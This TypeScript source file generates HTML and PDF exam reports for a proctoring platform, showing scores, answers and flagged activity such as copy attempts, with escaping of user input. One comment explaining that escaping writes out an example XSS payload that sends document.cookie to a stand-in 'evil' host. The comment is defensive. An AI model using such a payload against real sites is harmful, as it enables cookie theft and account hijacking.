import {
  getOtisakExamById,
  getUserAttempts,
  getAttemptResults,
} from '../db/otisak';
import { findUserById } from '../db/users';
import { getActivityLog, getActivityStats, enrichActivityEventData } from '../db/activity-log';
import { reportStrings, type ReportLocale, type ReportStrings } from './reportStrings';

type Awaitable<T> = T | Promise<T>;
type StudentReportPayload = {
  html: string;
  // Filesystem-safe base for the PDF filename (no extension).
  filenameBase: string;
  studentLabel: string;
  totalPoints: number;
  maxPoints: number;
  percentage: number;
  passed: boolean;
  timeSpentSeconds: number;
};

export type StudentReportResult =
  | { ok: true; data: StudentReportPayload }
  | { ok: false; error: string; status: number };

// User/admin-controlled strings going into this HTML must be escaped: exam title,
// question text, answer text, student.name/email, text_answer (free-text student
// input), subject_name. Otherwise a student types
//   <script>fetch('//evil/'+document.cookie)</script>
// and the PDF rendering page happily executes it.
function escapeHtml(s: unknown): string {
  if (s === null || s === undefined) return '';
  return String(s).replace(/[&<>"']/g, (c) => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' } as Record<string, string>
  )[c]);
}

function formatTime(date: Date | string, dateLocale: string): string {
  return new Date(date).toLocaleTimeString(dateLocale, { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}
function formatDate(date: Date | string, dateLocale: string): string {
  return new Date(date).toLocaleDateString(dateLocale, { day: '2-digit', month: '2-digit', year: 'numeric' });
}
function formatDuration(seconds: number): string {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${m}m ${s}s`;
}

// Inline SVG marks. Drawn as vectors so they render identically in every PDF
// viewer and need no symbol/emoji font (the old unicode glyphs turned into tofu
// on machines whose chromium lacked a symbol font).
function checkSvg(color: string, size = 13): string {
  return `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" style="flex:0 0 auto;"><polyline points="20 6 9 17 4 12"/></svg>`;
}
function crossSvg(color: string, size = 13): string {
  return `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" style="flex:0 0 auto;"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>`;
}
function warnSvg(color: string, size = 12): string {
  return `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex:0 0 auto;vertical-align:-2px;"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>`;
}

const SUSPICIOUS_TYPES = new Set([
  'copy_attempt', 'cut_attempt', 'paste_attempt', 'page_blur',
  'mouse_leave_window', 'devtools_attempt', 'print_attempt', 'tab_switch',
]);

// Robust font stack: Inter from the CDN when reachable, otherwise the locally
// installed DejaVu / Noto (Latin + Cyrillic). This guarantees Cyrillic reports
// render even with no network and on the minimal container image.
const FONT_HEAD = `
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { background:#070b14; color:#e5e7eb; font-family:'Inter','DejaVu Sans','Noto Sans',Arial,sans-serif; -webkit-print-color-adjust:exact !important; print-color-adjust:exact !important; }
  .mono { font-family:'JetBrains Mono','DejaVu Sans Mono',monospace; }
`;

// Single source of truth for the student-report HTML. Used both by the single-student
// /report/:userId/pdf endpoint and by the bulk /export-results ZIP route - they would
// otherwise drift apart with every styling tweak.
export async function buildStudentReportHTML(
  examId: string,
  userId: string,
  locale?: ReportLocale | string,
): Promise<StudentReportResult> {
  const S = reportStrings(locale);
  const dl = S.dateLocale;

  const exam = await getOtisakExamById(examId);
  if (!exam) return { ok: false, error: 'Exam not found', status: 404 };

  const student = await findUserById(userId);
  if (!student) return { ok: false, error: 'Student not found', status: 404 };

  const attempts = await getUserAttempts(userId);
  const attempt = attempts.find((a) => a.exam_id === examId && a.submitted);
  if (!attempt) return { ok: false, error: 'No submitted attempt', status: 404 };

  const results = await getAttemptResults(attempt.id);
  const activityLog = await getActivityLog(attempt.id);
  const stats = await getActivityStats(attempt.id);

  const totalPoints = Number(attempt.total_points);
  const maxPoints = Number(attempt.max_points);
  const percentage = maxPoints > 0 ? Math.round((totalPoints / maxPoints) * 100) : 0;
  const hasPassThreshold = (exam as { has_pass_threshold?: boolean }).has_pass_threshold !== false;
  const passed = hasPassThreshold && percentage >= Number(exam.pass_threshold);

  const suspiciousEvents = activityLog.filter((e) => SUSPICIOUS_TYPES.has(e.event_type));

  // Small coloured pill used to tag an answer (your pick / the correct one).
  const tag = (text: string, kind: 'yours-wrong' | 'yours-right' | 'correct') => {
    const styles = {
      'yours-wrong': 'background:rgba(220,38,38,0.18);color:#fca5a5;',
      'yours-right': 'background:rgba(5,150,105,0.20);color:#6ee7b7;',
      'correct': 'border:1px solid rgba(5,150,105,0.45);color:#6ee7b7;',
    }[kind];
    return `<span style="margin-left:auto;flex:0 0 auto;${styles}font-size:8.5px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;padding:2px 7px;border-radius:999px;white-space:nowrap;">${text}</span>`;
  };

  const questionsHtml = results?.questions.map((q, idx) => {
    const correct = q.points_awarded > 0;

    let body: string;
    if (q.answers.length > 0) {
      // Choice question: mark every picked answer ("Your answer") and every
      // correct answer, so it is obvious what the student chose vs the key.
      body = q.answers.map((a) => {
        const selected = q.selected_answer_ids.includes(a.id);
        const isCorrect = q.correct_answer_ids.includes(a.id);
        let bg = '#0f1623';
        let border = '#1f2937';
        let mark = `<span style="display:inline-block;width:13px;flex:0 0 auto;"></span>`;
        let badge = '';
        if (isCorrect) {
          bg = 'rgba(5,46,22,0.5)'; border = '#059669';
          mark = checkSvg('#34d399');
          badge = selected
            ? tag(`${S.yourAnswerTag} · ${S.correctTag}`, 'yours-right')
            : tag(S.correctAnswerLabel, 'correct');
        } else if (selected) {
          bg = 'rgba(69,10,10,0.5)'; border = '#dc2626';
          mark = crossSvg('#f87171');
          badge = tag(S.yourAnswerTag, 'yours-wrong');
        }
        return `<div style="padding:7px 11px;margin:4px 0;border-radius:7px;background:${bg};border:1px solid ${border};font-size:11px;color:#e5e7eb;display:flex;align-items:center;gap:9px;line-height:1.4;">
          ${mark}<span style="flex:1 1 auto;">${escapeHtml(a.text)}</span>${badge}
        </div>`;
      }).join('');
    } else {
      // Open-text and compound types (ordering / matching / fill_blank): show
      // the student's raw response.
      body = `<div style="padding:9px 11px;border-radius:7px;background:#0f1623;border:1px solid #1f2937;font-size:11px;color:#cbd5e1;line-height:1.5;">
        <span style="color:#64748b;font-size:9px;text-transform:uppercase;letter-spacing:1px;">${S.yourAnswerTag}</span><br/>
        ${q.text_answer ? escapeHtml(q.text_answer) : `<em style="color:#64748b;">${S.noAnswerText}</em>`}
      </div>`;
    }

    return `<div style="margin-bottom:14px;padding:14px;border-radius:10px;border:1px solid ${correct ? '#065f46' : '#7f1d1d'};background:${correct ? 'rgba(5,46,22,0.28)' : 'rgba(69,10,10,0.28)'};">
      <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:9px;">
        <span style="display:flex;align-items:center;gap:6px;font-size:10px;text-transform:uppercase;letter-spacing:2px;color:${correct ? '#34d399' : '#f87171'};">${correct ? checkSvg('#34d399', 12) : crossSvg('#f87171', 12)} ${S.questionWord} ${idx + 1}</span>
        <span class="mono" style="font-size:11px;font-weight:bold;color:${correct ? '#34d399' : '#f87171'};">${Number(q.points_awarded)}/${Number(q.question.points)} ${S.pointsShort}</span>
      </div>
      <p style="font-size:12px;color:#f1f5f9;margin-bottom:10px;line-height:1.5;">${escapeHtml(q.question.text)}</p>
      ${body}
    </div>`;
  }).join('') || '';

  const enrichedActivity = await enrichActivityEventData(examId, activityLog);
  const timelineHtml = enrichedActivity.slice(0, 200).map((e) => {
    const isSuspicious = SUSPICIOUS_TYPES.has(e.event_type);
    const color = isSuspicious ? '#f87171' : '#94a3b8';
    const bg = isSuspicious ? 'rgba(239,68,68,0.05)' : 'transparent';
    const label = S.events[e.event_type] || e.event_type;
    const dataStr = Object.entries(e.event_data || {}).map(([k, v]) => `${escapeHtml(k)}: ${escapeHtml(String(v))}`).join('<br/>');
    return `<tr style="background:${bg};">
      <td class="mono" style="padding:5px 8px;font-size:10px;color:#6b7280;white-space:nowrap;border-bottom:1px solid #1a1a2e;vertical-align:top;">${formatTime(e.timestamp, dl)}</td>
      <td style="padding:5px 8px;font-size:10px;color:${color};border-bottom:1px solid #1a1a2e;vertical-align:top;white-space:nowrap;">${isSuspicious ? warnSvg('#f87171', 10) + ' ' : ''}${escapeHtml(label)}</td>
      <td style="padding:5px 8px;font-size:10px;color:#cbd5e1;border-bottom:1px solid #1a1a2e;line-height:1.5;">${dataStr}</td>
    </tr>`;
  }).join('');

  const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTISAK - ${escapeHtml(student.name || student.email)}</title>
<style>
  @page { size: A4; margin: 0; }
  ${FONT_HEAD}
  .page { background:#070b14; padding:14mm 12mm; }
</style>
</head>
<body>
<div class="page">
  <div style="display:flex;align-items:center;justify-content:space-between;padding-bottom:20px;border-bottom:2px solid #2563eb;margin-bottom:30px;">
    <div>
      <div style="font-size:28px;font-weight:300;color:#3b82f6;letter-spacing:6px;">OTISAK</div>
      <div style="font-size:9px;color:#6b7280;letter-spacing:3px;text-transform:uppercase;margin-top:2px;">${S.subtitle}</div>
    </div>
    <div style="text-align:right;">
      <div style="font-size:10px;color:#6b7280;">${S.generated}</div>
      <div style="font-size:11px;color:#94a3b8;">${formatDate(new Date(), dl)} ${formatTime(new Date(), dl)}</div>
    </div>
  </div>

  <div style="display:flex;gap:16px;margin-bottom:24px;">
    <div style="flex:1;padding:16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:8px;">${S.student}</div>
      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${escapeHtml(student.name) || '-'}</div>
      <div class="mono" style="font-size:11px;color:#60a5fa;margin-top:2px;">${escapeHtml(student.index_number || '')}</div>
      <div style="font-size:10px;color:#6b7280;margin-top:4px;">${escapeHtml(student.email)}</div>
    </div>
    <div style="flex:1;padding:16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:8px;">${S.exam}</div>
      <div style="font-size:16px;font-weight:600;color:#f1f5f9;">${escapeHtml(exam.title)}</div>
      <div style="font-size:11px;color:#94a3b8;margin-top:2px;">${escapeHtml(exam.subject_name || '')}</div>
      <div style="font-size:10px;color:#6b7280;margin-top:4px;">${formatDate(attempt.started_at, dl)} | ${S.durationLabel}: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
    </div>
  </div>

  ${hasPassThreshold
    ? `<div style="padding:20px;border-radius:12px;background:${passed ? 'rgba(5,46,22,0.4)' : 'rgba(69,10,10,0.4)'};border:2px solid ${passed ? '#059669' : '#dc2626'};margin-bottom:24px;text-align:center;">
        <div class="mono" style="font-size:48px;font-weight:700;color:${passed ? '#34d399' : '#f87171'};">${totalPoints}/${maxPoints}</div>
        <div style="font-size:14px;color:${passed ? '#34d399' : '#f87171'};margin-top:4px;">${percentage}% | ${passed ? S.passed : S.notPassed}</div>
        <div style="font-size:10px;color:#6b7280;margin-top:4px;">${S.thresholdLabel}: ${exam.pass_threshold}% | ${S.timeLabel}: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
      </div>`
    : `<div style="padding:20px;border-radius:12px;background:rgba(30,58,138,0.3);border:2px solid #3b82f6;margin-bottom:24px;text-align:center;">
        <div class="mono" style="font-size:48px;font-weight:700;color:#60a5fa;">${totalPoints}/${maxPoints}</div>
        <div style="font-size:14px;color:#60a5fa;margin-top:4px;">${percentage}%</div>
        <div style="font-size:10px;color:#6b7280;margin-top:4px;">${S.timeLabel}: ${formatDuration(Number(attempt.time_spent_seconds))}</div>
      </div>`
  }

  <div style="margin-bottom:24px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#3b82f6;margin-bottom:12px;font-weight:600;">${S.activityStats}</div>
    <div style="display:flex;gap:10px;flex-wrap:wrap;">
      ${[
        { label: S.statTotalEvents, value: stats.totalEvents, color: '#3b82f6' },
        { label: S.statKeystrokes, value: stats.keystrokes, color: '#3b82f6' },
        { label: S.statAnswerChanges, value: stats.answerChanges, color: '#f59e0b' },
        { label: S.statWindowBlur, value: stats.tabSwitches, color: stats.tabSwitches > 3 ? '#ef4444' : '#f59e0b' },
        { label: S.statCopyAttempts, value: stats.copyAttempts, color: stats.copyAttempts > 0 ? '#ef4444' : '#22c55e' },
        { label: S.statRightClicks, value: stats.rightClicks, color: stats.rightClicks > 2 ? '#ef4444' : '#6b7280' },
      ].map((s) => `<div style="flex:1;min-width:120px;padding:12px;border-radius:8px;background:#0d1117;border:1px solid #1f2937;text-align:center;">
        <div class="mono" style="font-size:22px;font-weight:700;color:${s.color};">${s.value}</div>
        <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:4px;">${s.label}</div>
      </div>`).join('')}
    </div>
  </div>

  ${suspiciousEvents.length > 0 ? `
  <div style="margin-bottom:24px;padding:16px;border-radius:10px;background:rgba(239,68,68,0.05);border:1px solid rgba(239,68,68,0.2);">
    <div style="display:flex;align-items:center;gap:6px;font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#ef4444;margin-bottom:10px;font-weight:600;">${warnSvg('#ef4444', 13)} ${S.suspiciousActivity} (${suspiciousEvents.length})</div>
    <table style="width:100%;border-collapse:collapse;">
      ${suspiciousEvents.map((e) => `<tr>
        <td class="mono" style="padding:3px 6px;font-size:10px;color:#6b7280;">${formatTime(e.timestamp, dl)}</td>
        <td style="padding:3px 6px;font-size:10px;color:#f87171;">${escapeHtml(S.events[e.event_type] || e.event_type)}</td>
      </tr>`).join('')}
    </table>
  </div>
  ` : `
  <div style="margin-bottom:24px;padding:14px;border-radius:10px;background:rgba(34,197,94,0.05);border:1px solid rgba(34,197,94,0.2);">
    <div style="display:flex;align-items:center;gap:7px;font-size:11px;color:#22c55e;">${checkSvg('#22c55e', 13)} ${S.noSuspicious}</div>
  </div>
  `}

  <div style="margin-bottom:24px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#3b82f6;margin-bottom:12px;font-weight:600;">${S.answersPerQuestion}</div>
    ${questionsHtml}
  </div>

  <div style="margin-bottom:24px;">
    <div style="font-size:11px;text-transform:uppercase;letter-spacing:3px;color:#3b82f6;margin-bottom:12px;font-weight:600;">${S.timelineTitle} (${activityLog.length} ${S.eventsWord})</div>
    <div style="border-radius:10px;background:#0d1117;border:1px solid #1f2937;overflow:hidden;">
      <table style="width:100%;border-collapse:collapse;">
        <thead>
          <tr style="background:#111827;">
            <th style="padding:6px 8px;text-align:left;font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1f2937;">${S.colTime}</th>
            <th style="padding:6px 8px;text-align:left;font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1f2937;">${S.colEvent}</th>
            <th style="padding:6px 8px;text-align:left;font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1f2937;">${S.colDetails}</th>
          </tr>
        </thead>
        <tbody>${timelineHtml}</tbody>
      </table>
      ${activityLog.length > 200 ? `<div style="padding:8px;text-align:center;font-size:10px;color:#6b7280;">... ${S.andMoreEvents} ${activityLog.length - 200} ${S.eventsWord}</div>` : ''}
    </div>
  </div>

  <div style="border-top:1px solid #1f2937;padding-top:16px;text-align:center;">
    <div style="font-size:10px;color:#4b5563;">OTISAK v2.0 | ${S.footerAuto}</div>
    <div style="font-size:9px;color:#374151;margin-top:4px;">${S.footerConfidential}</div>
  </div>
</div>
</body>
</html>`;

  const safeName = (student.index_number || student.name || student.email).replace(/[^a-z0-9._-]+/gi, '_');

  return {
    ok: true,
    data: {
      html,
      filenameBase: `otisak-izvestaj-${safeName}`,
      studentLabel: student.name || student.email,
      totalPoints,
      maxPoints,
      percentage,
      passed,
      timeSpentSeconds: Number(attempt.time_spent_seconds),
    },
  };
}

// Build the HTML for the *summary* (results table) PDF. The CSV is a sibling artifact
// - this is the formatted-table version that prints nicely as a one-shot overview.
export function buildResultsTableHTML(args: {
  examTitle: string;
  subjectName: string | null;
  passThreshold: number;
  hasPassThreshold?: boolean;
  locale?: ReportLocale | string;
  rows: Array<{
    name: string | null;
    indexNumber: string | null;
    email: string;
    totalPoints: number;
    maxPoints: number;
    percentage: number;
    passed: boolean;
    timeSpentSeconds: number;
    suspiciousCount: number;
  }>;
}): string {
  const { examTitle, subjectName, passThreshold, hasPassThreshold = true, rows } = args;
  const S: ReportStrings = reportStrings(args.locale);
  const dl = S.dateLocale;

  const passedCount = hasPassThreshold ? rows.filter((r) => r.passed).length : 0;
  const avgPct = rows.length ? Math.round(rows.reduce((s, r) => s + r.percentage, 0) / rows.length) : 0;

  const rowsHtml = rows
    .slice()
    .sort((a, b) => b.totalPoints - a.totalPoints)
    .map((r, i) => {
      const stripe = i % 2 === 0 ? '#0d1117' : '#111827';
      // When threshold is disabled, drop the verdict colouring and the Status
      // column. The score becomes a neutral blue so admins don't read green as
      // "passed" when there's no threshold to be passed.
      const scoreColor = hasPassThreshold ? (r.passed ? '#34d399' : '#f87171') : '#60a5fa';
      return `<tr style="background:${stripe};">
        <td class="mono" style="padding:8px 10px;font-size:11px;color:#cbd5e1;border-bottom:1px solid #1f2937;">${i + 1}</td>
        <td style="padding:8px 10px;font-size:11px;color:#f1f5f9;border-bottom:1px solid #1f2937;">${escapeHtml(r.name || '-')}</td>
        <td class="mono" style="padding:8px 10px;font-size:11px;color:#60a5fa;border-bottom:1px solid #1f2937;">${escapeHtml(r.indexNumber || '-')}</td>
        <td style="padding:8px 10px;font-size:11px;color:#94a3b8;border-bottom:1px solid #1f2937;">${escapeHtml(r.email)}</td>
        <td class="mono" style="padding:8px 10px;font-size:11px;color:${scoreColor};border-bottom:1px solid #1f2937;text-align:right;font-weight:600;">${r.totalPoints}/${r.maxPoints}</td>
        <td class="mono" style="padding:8px 10px;font-size:11px;color:${scoreColor};border-bottom:1px solid #1f2937;text-align:right;">${r.percentage}%</td>
        ${hasPassThreshold ? `<td style="padding:8px 10px;font-size:10px;color:${scoreColor};border-bottom:1px solid #1f2937;text-transform:uppercase;letter-spacing:1px;">${r.passed ? S.statusPassed : S.statusNot}</td>` : ''}
        <td class="mono" style="padding:8px 10px;font-size:11px;color:#94a3b8;border-bottom:1px solid #1f2937;text-align:right;">${formatDuration(r.timeSpentSeconds)}</td>
        <td style="padding:8px 10px;font-size:11px;color:${r.suspiciousCount > 0 ? '#ef4444' : '#6b7280'};border-bottom:1px solid #1f2937;text-align:right;font-weight:${r.suspiciousCount > 0 ? '700' : '400'};">${r.suspiciousCount}</td>
      </tr>`;
    })
    .join('');

  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTISAK - ${escapeHtml(examTitle)}</title>
<style>
  @page { size: A4 landscape; margin: 0; }
  ${FONT_HEAD}
  .page { background:#070b14; padding:12mm 12mm; }
</style>
</head>
<body>
<div class="page">
  <div style="display:flex;align-items:center;justify-content:space-between;padding-bottom:16px;border-bottom:2px solid #2563eb;margin-bottom:20px;">
    <div>
      <div style="font-size:24px;font-weight:300;color:#3b82f6;letter-spacing:6px;">OTISAK</div>
      <div style="font-size:9px;color:#6b7280;letter-spacing:3px;text-transform:uppercase;margin-top:2px;">${S.resultsSubtitle}</div>
    </div>
    <div style="text-align:right;">
      <div style="font-size:10px;color:#6b7280;">${S.generated}</div>
      <div style="font-size:11px;color:#94a3b8;">${formatDate(new Date(), dl)} ${formatTime(new Date(), dl)}</div>
    </div>
  </div>

  <div style="display:flex;gap:16px;margin-bottom:20px;">
    <div style="flex:1;padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;">
      <div style="font-size:9px;text-transform:uppercase;letter-spacing:2px;color:#3b82f6;margin-bottom:6px;">${S.exam}</div>
      <div style="font-size:15px;font-weight:600;color:#f1f5f9;">${escapeHtml(examTitle)}</div>
      ${subjectName ? `<div style="font-size:11px;color:#94a3b8;margin-top:2px;">${escapeHtml(subjectName)}</div>` : ''}
    </div>
    <div style="padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;text-align:center;">
      <div class="mono" style="font-size:22px;font-weight:700;color:#3b82f6;">${rows.length}</div>
      <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:2px;">${S.studentsWord}</div>
    </div>
    ${hasPassThreshold ? `<div style="padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;text-align:center;">
      <div class="mono" style="font-size:22px;font-weight:700;color:#34d399;">${passedCount}</div>
      <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:2px;">${S.passedWord} (${S.thresholdLabel} ${passThreshold}%)</div>
    </div>` : ''}
    <div style="padding:14px 16px;border-radius:10px;background:#0d1117;border:1px solid #1e3a5f;text-align:center;">
      <div class="mono" style="font-size:22px;font-weight:700;color:#f59e0b;">${avgPct}%</div>
      <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:2px;">${S.averageWord}</div>
    </div>
  </div>

  <table style="width:100%;border-collapse:collapse;border-radius:10px;overflow:hidden;border:1px solid #1f2937;">
    <thead>
      <tr style="background:#1a2340;">
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">#</th>
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.colName}</th>
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.colIndex}</th>
        <th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.colEmail}</th>
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.colPoints}</th>
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">%</th>
        ${hasPassThreshold ? `<th style="padding:8px 10px;text-align:left;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.colStatus}</th>` : ''}
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.timeLabel}</th>
        <th style="padding:8px 10px;text-align:right;font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">${S.colSuspicious}</th>
      </tr>
    </thead>
    <tbody>${rowsHtml}</tbody>
  </table>

  <div style="border-top:1px solid #1f2937;margin-top:16px;padding-top:10px;text-align:center;">
    <div style="font-size:9px;color:#4b5563;">OTISAK v2.0 | ${S.resultsFooterAuto}</div>
  </div>
</div>
</body>
</html>`;
}

// Convenience: render an HTML page to a PDF buffer using a (possibly shared) Puppeteer
// browser. Caller is responsible for closing the browser.
//
// Timeouts: setContent with `networkidle0` can hang if a remote asset (Google
// Fonts CDN, in particular) is slow or blocked. Without explicit timeouts the
// request handler that called us would wait indefinitely, holding a DB
// connection and a chromium page until the client gives up. We cap each phase
// so the worst case is "PDF fails for this student" rather than "the server is
// stuck for that exam's exporters".
const PUPPETEER_NAVIGATION_TIMEOUT_MS = 15_000;
const PUPPETEER_PDF_TIMEOUT_MS = 30_000;

export async function renderHtmlToPdf(html: string, browserPromise: Awaitable<import('puppeteer').Browser>, landscape = false): Promise<Buffer> {
  const browser = await browserPromise;
  const page = await browser.newPage();
  // domcontentloaded is significantly more reliable than networkidle0 - fonts
  // load from a CDN over the open internet and the previous `networkidle0`
  // waited for *every* outbound request to settle. domcontentloaded fires when
  // the inline HTML/CSS is parsed, which is enough for our report (no JS
  // hydration, all styles inline).
  page.setDefaultNavigationTimeout(PUPPETEER_NAVIGATION_TIMEOUT_MS);
  page.setDefaultTimeout(PUPPETEER_NAVIGATION_TIMEOUT_MS);
  try {
    await page.emulateMediaType('screen');
    await page.setContent(html, { waitUntil: 'domcontentloaded', timeout: PUPPETEER_NAVIGATION_TIMEOUT_MS });
    const pdf = await page.pdf({
      format: 'A4',
      landscape,
      printBackground: true,
      preferCSSPageSize: true,
      margin: { top: 0, bottom: 0, left: 0, right: 0 },
      timeout: PUPPETEER_PDF_TIMEOUT_MS,
    });
    return Buffer.from(pdf);
  } finally {
    // Always close the page - even if setContent / pdf throws, leaking pages
    // would pile up inside the long-lived browser singleton.
    await page.close().catch((err) => console.error('renderHtmlToPdf: page.close failed', err));
  }
}
